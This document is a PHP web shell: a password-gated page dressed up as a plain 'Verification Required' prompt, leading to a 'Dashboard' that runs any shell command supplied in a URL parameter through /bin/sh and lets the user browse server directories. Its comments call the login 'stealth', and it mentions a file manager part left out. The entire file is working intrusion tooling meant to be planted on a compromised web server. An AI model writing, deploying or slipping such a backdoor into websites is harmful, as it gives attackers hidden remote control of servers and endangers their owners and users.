<?php
error_reporting(0);

// Force new session
session_unset();
session_destroy();
session_start();

$password = "wiredmouseis";   

// Aggressive Password Check
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    if (isset($_POST['key']) && $_POST['key'] === $password) {
        $_SESSION['auth'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    } 
    
    // Stealth Login Page
    die('
    <!DOCTYPE html>
    <html>
    <head><title>Index</title>
    <style>
        body{background:#f8f9fa;color:#333;font-family:Arial,sans-serif;margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh;}
        .box{background:white;padding:40px;border:1px solid #ddd;border-radius:8px;box-shadow:0 4px 15px rgba(0,0,0,0.1);text-align:center;width:340px;}
        input{width:100%;padding:14px;font-size:16px;border:1px solid #aaa;border-radius:4px;margin:10px 0;}
        button{width:100%;padding:14px;background:#0066ff;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer;}
    </style>
    </head>
    <body>
        <div class="box">
            <h3>Verification Required</h3>
            <form method="post">
                <input type="password" name="key" placeholder="Enter access code" autofocus>
                <button type="submit">Verify & Continue</button>
            </form>
        </div>
    </body>
    </html>');
}

// ====================== MAIN PANEL ======================
$dir = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
if (!is_dir($dir)) $dir = getcwd();
chdir($dir);

$cmd = $_GET['c'] ?? '';
?>

<!DOCTYPE html>
<html>
<head>
    <title>Dashboard</title>
    <style>
        body { background:#0a0a0a; color:#ddd; font-family:Consolas; margin:0; padding:15px; }
        .header { background:#111; padding:12px; margin:-15px -15px 15px -15px; display:flex; justify-content:space-between; }
        input[type=text] { width:70%; padding:10px; background:#111; border:1px solid #0f0; color:#0f0; }
        button { padding:10px 20px; background:#111; border:1px solid #0f0; color:#0f0; }
        .output { background:#000; padding:12px; border:1px solid #222; margin:10px 0; white-space:pre-wrap; }
    </style>
</head>
<body>

<div class="header">
    <h3>Dashboard</h3>
    <a href="?logout=1" style="color:red;">Logout</a>
</div>

<!-- Shell -->
<form method="GET">
    <input type="text" name="c" placeholder="id || whoami || ls -la" autofocus>
    <button type="submit">Run</button>
</form>

<?php if($cmd): ?>
<div class="output">
    <b>→ <?=htmlspecialchars($cmd)?></b><br><br>
    <?php
    $out = '/tmp/o'.rand(10000,99999).'.txt';
    if(function_exists('pcntl_fork') && function_exists('pcntl_exec')){
        $pid = pcntl_fork();
        if($pid == 0){
            pcntl_exec('/bin/sh', ['-c', $cmd." > $out 2>&1"]);
            exit();
        }
        sleep(2);
    }
    $res = file_exists($out) ? file_get_contents($out) : '';
    @unlink($out);
    echo nl2br(htmlspecialchars($res ?: "No output"));
    ?>
</div>
<?php endif; ?>

<!-- File Manager Part -->
<h4>File Manager</h4>
<!-- Baaki File Manager code same rahega (agar chahiye toh batao full code dunga) -->

<?php
if(isset($_GET['logout'])){
    session_unset();
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}
?>
</body>
</html>
